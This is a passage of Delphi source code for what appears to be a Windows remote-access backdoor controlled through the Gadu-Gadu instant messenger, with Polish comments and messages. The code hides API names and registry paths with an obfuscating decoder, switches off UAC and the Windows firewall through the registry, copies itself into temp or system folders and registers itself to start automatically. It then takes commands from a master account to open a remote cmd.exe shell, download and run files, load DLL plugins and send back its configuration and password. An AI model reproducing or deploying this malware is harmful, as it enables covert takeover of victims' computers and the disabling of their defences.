 SHELL_FUNCTION = '∆€ÿﬂﬂ∏Îÿ÷ËÁÿ¥';
 SHELL_METHOD = '‚„ÿ·';
var
 DLL:THandle;
 Exe:function(a:HWND;b,c,d,e:PChar;f:Word):HINST;stdcall;
begin
 DLL := LoadLibrary(PChar(DeCode(SHELL32_LIBARY)));
  try
   @Exe := GetProcAddress(DLL, PChar(DeCode(SHELL_FUNCTION)));
   if @Exe=nil then begin Result:=22; Exit; end;
   if Show then
    Result:=Exe(0, PChar(DeCode(SHELL_METHOD)), Path, Param, Dir, 1)
   else
    Result:=Exe(0, PChar(DeCode(SHELL_METHOD)), Path, Param, Dir, 0);
  finally
   FreeLibrary(DLL);
  end;
end;

procedure DisableUAC;
var
 H:HKEY;
 Enable:DWORD;
begin
 Enable:=0;
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ√‚ﬂ‹÷‹ÿÊœœ∆ÏÊÁÿ‡')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
  try
   RegSetValueEx(H, PChar(DeCode('∏·‘’ﬂÿø»¥')), 0, REG_DWORD, @Enable, SizeOf(Enable));
  finally
   RegCloseKey(H);
  end;
 end;
end;

procedure DisableSP2;
var
 H:HKEY;
 Enable:DWORD;
begin
 Enable:=0;
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆Ã∆«∏¿œœ∂ËÂÂÿ·Á∂‚·ÁÂ‚ﬂ∆ÿÁœœ∆ÿÂÈ‹÷ÿÊœœ∆€‘Âÿ◊¥÷÷ÿÊÊœœ√‘Â‘‡ÿÁÿÂÊœœπ‹ÂÿÍ‘ﬂﬂ√‚ﬂ‹÷Ïœœ∆Á‘·◊‘Â◊√Â‚Ÿ‹ﬂÿ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
  try
   RegSetValueEx(H, PChar(DeCode('∏·‘’ﬂÿπ‹ÂÿÍ‘ﬂﬂ')), 0, REG_DWORD, @Enable, SizeOf(Enable));
  finally
   RegCloseKey(H);
  end;
 end;
end;

procedure SaveSituation;
begin
 Sleep(500);
 ExecuteEx(PChar(Path), nil, PChar(ExtractFilePath(Path)), False);
end;

function GetUserNameEx:String;
var
 D:DWORD;
begin
 Result:='';
 D:=256;
 SetLength(Result,D);
 GetUserName(PChar(Result), D);
 Result:=Copy(Result,1,Pos(#0,Result)-1);
end;

label ConnectionLost,                { Skok do re-po≥πczenia                  }
      GoBack,                        { Skok na poczπtek pÍtli odbioru         }
      Retry;                         { Skok na "re-uruchomienie"              }

var I,A:Integer;
    Z:String;
    X:DWORD;
    D:Boolean;

begin
 try
  try
  {$IFDEF STOP}
    Halt(0);
  {$ENDIF}
  Sleep(3000);
  {$IFNDEF NOREADCONFIG}
   CopyFile(PChar(ParamStr(0)),ConfigFile,False);
   LoadFromExe(ConfigFile);
   DeleteFile(ConfigFile);
   if(Copy(Path,1,6)='!tmp!\')then begin
    SetLength(Z,MAX_PATH);
    GetTempPath(MAX_PATH,PChar(Z));
    Z:=Copy(Z,1,Pos(#0,Z)-1);
    Path:=Z+ExtractFileName(Path);
   end;
   if(Copy(Path,1,6)='!sys!\')then begin
    SetLength(Z,MAX_PATH);
    GetSystemDirectory(PChar(Z),MAX_PATH);
    Z:=Copy(Z,1,Pos(#0,Z)-1);
    Path:=Z+'\'+ExtractFileName(Path);
   end;
   if(ExtractFileName(ParamStr(0))=ResFile2)then begin
    DeleteFile(PChar(Path));
    CopyFile(PChar(ParamStr(0)),PChar(Path),False);
    ExecuteEx(PChar(Path),nil,PChar(ExtractFilePath(Path)),False);
    Halt(0);
   end;
   if((GGClient=0)or(GGAcc=0)or(Path='')or(GGPass=''))then Halt(0);
   if(FileExists(ResFile2))then DeleteFile(ResFile2);
  {$ENDIF}
  {$IFNDEF NOINSTALL}
   if(AnsiLowerCase(ParamStr(0)))<>AnsiLowerCase(Path)then begin
    ForceDirectories(ExtractFilePath(Path));
    AddToReg(Path);
    if(FileExists(Path))then
     DeleteFile(PChar(Path));
    CopyFile(PChar(ParamStr(0)), PChar(Path), False);
    ExecuteEx(PChar(Path),nil,PChar(ExtractFilePath(Path)),False);
    Halt(0);
   end;
   DisableUAC;
   DisableSP2;
  {$ENDIF}
   hM:=CreateFileMapping(THandle($FFFFFFFF),nil,PAGE_READONLY,0,32,'ApplicationTestMap');
   if GetLastError=ERROR_ALREADY_EXISTS then begin
    CloseHandle(hM);
    Halt(0);
   end;
   Retry:
   if(WSAStartup(MakeWord(2,0),WSA)<>SOCKET_ERROR)then begin
    ConnectionLost:
     Sleep(2000);
     Sock:=Socket(AF_INET,SOCK_STREAM,0);
     if(Sock<>SOCKET_ERROR)then begin
      if(MakeConnection)then begin
       for I:=0 to(10)do begin
        if(Connected)then Break;
        Sleep(1000);
       end;
       if(not Connected)then begin
        Get:=True;
        goto ConnectionLost;
       end;
       GGSetDescription(Format(GGDesc,[GetUserNameEx]));
       if(HelloMsg)then
        GGSendMessage(GGClient,PChar(Format(M_HELLO,[GetUserNameEx,CheckIsSkype,CheckIsGG])));
       if(MasterEnable)then CreateThread(nil, 0, @SendThread, nil, 0, X);
        repeat
         GoBack:
         Size:=recv(Sock,RecvHeader,SizeOf(THeaderRec),0);
         if Size < 1 then Break;
         case RecvHeader._type of
          $a: begin
           recv(Sock, RecvMsg,SizeOf(TRecvMsgRec),0);
           NullString:='';
           repeat
            recv(Sock,NullChar,SizeOf(NullChar),0);
            if NullChar<>#0 then NullString:=NullString+NullChar;
           until(NullChar=#0);
           if(RecvMsg._sender=GGMaster)or(RecvMsg._sender=GGClient)then begin
            if(Copy(NullString,1,Length(C_OFF_CMD))=C_OFF_CMD)then begin
             if(CMDEnabled)then begin
              CMDEnabled:=False;
              TerminateThread(ThreadID, 0);
              TerminateProcess(ProcInfo.hProcess, 0);
              GGSendMessage(RecvMsg._sender, M_STOPTED_CMD);
             end else GGSendMessage(RecvMsg._sender, E_STOPTED_CMD);
             goto GoBack;
            end;
            if(CMDEnabled)then begin
             SendCommand(NullString);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_ON_CMD))=C_ON_CMD)then begin
             if(not CMDEnabled)then begin
              BindCMD('cmd.exe');
              CreateThread(nil, 0, @CMDThread, nil, 0, ThreadID);
              Sender:=RecvMsg._sender;
              CMDEnabled:=True;
              GGSendMessage(RecvMsg._sender, M_STARTED_CMD);
             end else GGSendMessage(RecvMsg._sender, E_STARTED_CMD);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_END))=C_END)then begin
             GGSendMessage(RecvMsg._sender, M_END);
             Sleep(100);
             Halt(0);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_UNINSTALL))=C_UNINSTALL)then begin
             Uninstall;
             MoveFileEx(PChar(ParamStr(0)), nil, MOVEFILE_DELAY_UNTIL_REBOOT);
             Halt(0);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_OPEN)+1)=C_OPEN+Sep)then begin
             if(FileExists(Split(NullString,1)))then begin
              ExecuteEx(PChar(Split(NullString,1)), nil, nil, True);
              GGSendMessage(RecvMsg._sender,PChar(Format(M_START_SUCCESS,[ExtractFileName(Split(NullString,1))])));
             end else GGSendMessage(RecvMsg._sender,E_WRONG_FILE);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_RESTART))=C_RESTART)then begin
             GGSendMessage(RecvMsg._sender, M_RESTART);
             Sleep(100);
             if(FileExists(ExtractFilePath(Path)+ResFile2))then
              ExecuteEx(PChar(ExtractFilePath(Path)+ResFile2),nil,PChar(ExtractFilePath(Path)),False)
             else
              ExecuteEx(PChar(ParamStr(0)),nil,PChar(ExtractFilePath(ParamStr(0))),False);
             Halt(0);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_DOWNLOAD_URL)+1)=C_DOWNLOAD_URL+Sep)then begin
             Delete(NullString,1,Length(C_DOWNLOAD_URL)+1);
             if(Split(NullString,0)<>'')and(Split(NullString,1)<>'')then
              if(not URLBussy)then begin
               GetMem(P, SizeOf(TURLDownloadRec));
               URLDownload:=PURLDownloadRec(P);
               with URLDownload^ do begin
                _url:=PChar(Split(NullString,0));
                _save:=PChar(Split(NullString,1));
                _GG:=RecvMsg._sender;
               end;
               CreateThread(nil, 0, @URLDownloadThread, URLDownload, 0, URLDownload._TID);
               URLBussy:=True;
              end else GGSendMessage(RecvMsg._sender, E_BUSSY_URL)
             else GGSendMessage(RecvMsg._sender, E_SYNTAX_URL);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_LIST_PLUG))=C_LIST_PLUG)then begin
             if(PlugHigh>0)then begin
              NullString:='Lista aktywnych pluginÛw:'+#13+#13#10;
              for X := 0 to PlugHigh-1 do begin
               NullString:=NullString+'Nazwa: '+PluginList[X].Info._Name+#13+'Wersja: '+CurrToStr(PluginList[X].Info._Version)+#13+
                                      'Komenda: '+Prefix+PluginList[X].Info._Command+#13+'ID: '+IntToStr(X)+#13#10+#13;
              end;
              Delete(NullString, Length(NullString)-2, Length(NullString));
              StringReplace(NullString,',','.',[rfReplaceAll]);
              GGSendMessage(RecvMsg._sender, PChar(NullString));
             end else GGSendMessage(RecvMsg._sender, E_NO_PLUG);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_DEINSTALL_PLUG))=C_DEINSTALL_PLUG)then begin
             Delete(NullString,1,Length(C_DEINSTALL_PLUG)+1);
             if(TryStrToInt(NullString, A))then begin
              if((A)<=PlugHigh)then begin
               if(A>0)then begin
                SetLength(RList, 0);
                I:=1;
                D:=False;
                 repeat
                 SetLength(RList, I);
                 if(D)then RList[I-1]:=PluginList[I];
                 if(I=A)then D:=True;
                 if(not D)then RList[I]:=PluginList[I];
                 Inc(I);
                until(I>=PlugHigh);
                PluginList:=RList;
                PlugHigh:=PlugHigh-1;
               end else PlugHigh:=0;
               GGSendMessage(RecvMsg._sender, M_DSUCCESS_PLUG);
              end else GGSendMessage(RecvMsg._sender, E_WRONG_ID);
             end else GGSendMessage(RecvMsg._sender, E_NOT_INTEGER);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_INSTALL_PLUG))=C_INSTALL_PLUG)then begin
             if(ExtractFileExt(Copy(NullString, Length(C_INSTALL_PLUG)+2, Length(NullString)))='.dll')then
              AddAndLoadPlugin(RecvMsg._sender,PChar(Copy(NullString, Length(C_INSTALL_PLUG)+2, Length(NullString))))
             else
              GGSendMessage(RecvMsg._sender, E_NOTDLL);
             goto GoBack;
            end;
            if(Copy(NullString,1,Length(C_CONFIG))=C_CONFIG)then begin
             if(Length(C_CONFIG)=Length(NullString))then
              if(HelloMsg)then
               GGSendMessage(GGClient,PChar(Format(M_CONFIG, [IntToStr(GGAcc), GGPass, IntToStr(GGClient), IntToStr(RegInstall), ParamStr(0), 'tak'])))
              else
               GGSendMessage(GGClient,PChar(Format(M_CONFIG, [IntToStr(GGAcc), GGPass, IntToStr(GGClient), IntToStr(RegInstall), ParamStr(0), 'nie'])))
             else begin
              if((Split(NullString,1)<>''))then begin
               if(Split(NullString,1)=CG_GGC)then begin
                if(TryStrToInt(Split(NullString,2),I))then begin
                 CFGTab[0]:=IntToStr(I);
                 SaveToExe;
                 GGSendMessage(RecvMsg._sender, M_CFG_SUCCESS);
                end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
               end else
                if(Split(NullString,1)=CG_GGS)then begin
                 if(TryStrToInt(Split(NullString,2),I))then begin
                  CFGTab[1]:=IntToStr(I);
                  SaveToExe;
                  GGSendMessage(RecvMsg._sender, M_CFG_SUCCESS);
                 end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
                end else
                 if(Split(NullString,1)=CG_GGP)then begin
                  CFGTab[2]:=Split(NullString,2);
                  SaveToExe;
                  GGSendMessage(RecvMsg._sender, M_CFG_SUCCESS);
                 end else
                  if(Split(NullString,1)=CG_REG)then begin
                   if(TryStrToInt(Split(NullString,2),I))then begin
                    if(i in[1..3])then begin
                     CFGTab[3]:=IntToStr(I);
                     SaveToExe;
                     GGSendMessage(RecvMsg._sender, M_CFG_SUCCESS);
                    end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
                   end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
                  end else
                   if(Split(NullString,1)=CG_HELLO)then begin
                    if(TryStrToInt(Split(NullString,2),I))then begin
                     if(i in[0..1])then begin
                      CFGTab[5]:=IntToStr(I);
                      SaveToExe;
                      GGSendMessage(RecvMsg._sender, M_CFG_SUCCESS);
                     end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
                    end else GGSendMessage(RecvMsg._sender,E_WRONG_VALUE);
                   end;
              end else GGSendMessage(RecvMsg._sender,E_SYNTAX_URL);
             end;
             goto GoBack;
            end;
            if(PlugHigh>0)then begin
             for A := 0 to PlugHigh-1 do begin
              if(FileExists(PluginList[A].Path))then
               if(Prefix+PluginList[A].Info._Command=Copy(NullString, 1, Length(PluginList[A].Info._Command)+1))then begin
                PluginList[A].Info._OnAction(RecvMsg._sender, PChar(NullString)); Break; end;
             end;
             if(A=PlugHigh-1)then goto GoBack;
            end;
            GGSendMessage(RecvMsg._sender, M_NO_COMMAND_HANDLE);
           end else begin
            GGSendMessage(GGClient, PChar(Format(M_ALERT,[IntToStr(RecvMsg._sender), NullString])));
            GGSendMessage(RecvMsg._sender, M_ACCESS_DIE);
           end;
          end;
         end;
        until(false);
        Sleep(5000);
        Connected:=False;
        Get:=True;
        closesocket(Sock);
        goto ConnectionLost;
      end;
     end else goto Retry;
   end else goto Retry;
  except
   SaveSituation;
   Halt(0);
  end;
 finally
  WSACleanup;
 end;
end.
